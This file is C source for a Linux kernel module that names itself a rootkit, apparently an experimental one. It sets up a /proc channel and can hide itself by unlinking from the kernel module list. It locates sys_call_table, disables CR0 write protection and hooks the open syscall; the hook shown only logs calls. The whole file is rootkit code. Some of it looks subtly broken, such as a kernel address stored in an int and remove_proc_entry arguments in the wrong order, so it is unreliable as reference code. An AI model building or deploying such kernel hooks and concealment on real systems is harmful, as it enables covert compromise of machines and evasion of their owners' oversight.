#include<linux/init.h>
#include<linux/module.h>
#include<linux/kernel.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/proc_fs.h>
#include <linux/semaphore.h>

#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ChoKyuWon");

unsigned long* sys_call_table;
static struct list_head *module_prev;
static struct proc_dir_entry *proc_dir = NULL;
static struct proc_dir_entry *proc_file = NULL;
static char message[256]={0};

static int rootkit_proc_open(struct inode* a, struct file* b)
{
    return 0;
}

static const struct file_operations proc_ops = {
    .owner          = THIS_MODULE,
    .open           = rootkit_proc_open,
};

int set_channel(void)
{
    proc_dir = proc_mkdir(MODULE_DIR, NULL);
    if(proc_dir == NULL){
        pr_info("Cannot Create folder\n");
        return -1;
    }
    proc_file = proc_create(MODULE_FILE, 0, proc_dir, &proc_ops);
    if(proc_file == NULL){
        pr_info("Cannot Create file");
        return -1;
    }
    pr_info("proc create success!\n");
    return 0;
}
void close_channel(void)
{
    remove_proc_entry(MODULE_DIR, proc_dir);
    remove_proc_entry(MODULE_FILE, NULL);
    
    proc_remove(proc_file);
    proc_remove(proc_dir);
}
void module_hide(void)
{
    pr_info("Yeah I'm Hide!\n");
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void module_unhide(void)
{
    pr_info("Yeah You found me!\n");
    list_add(&THIS_MODULE->list, module_prev);
}

unsigned long *find_syscall_table(void)
{
    unsigned long* sctable = NULL;
    int i = kallsyms_lookup_name("sys_call_table");
    if (i == 0) {
        return NULL;
    }
    sctable = (unsigned long*)i;
    return sctable;
}

unsigned long cr0;
asmlinkage int (*original_open) (const char*, int);
asmlinkage int hooked_open(const char* path, int flags)
{
    pr_info("something is opened\n");
    return original_open(path, flags);
}

static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

void protect_memory(void)
{
    write_cr0_forced(cr0);
}
void unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}

static int __init rootkit_init(void)
{
    if(set_channel()!=0){
        pr_info("Fail to setup channel\n");
        return 0;
    }
    sys_call_table = find_syscall_table();
    if(sys_call_table != NULL){
        pr_info("HELL World! syscall table is on %p!\n", sys_call_table);
        cr0 = read_cr0();
        original_open = sys_call_table[__NR_open];
        pr_info("original open: %x\n", sys_call_table[__NR_open]);
        unprotect_memory();
        sys_call_table[__NR_open] = (unsigned long)hooked_open;
        protect_memory();
        pr_info("hooked_open: %x\n", sys_call_table[__NR_open]);
    }
    else{
        pr_info("Damm, I can't find syscall table!\n");
        return 0;
    }
    return 0;
}

static void __exit rootkit_exit(void)
{
    close_channel();
    unprotect_memory();
    sys_call_table[__NR_open] = original_open;
    protect_memory();
	pr_info("Rootkit terminated.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
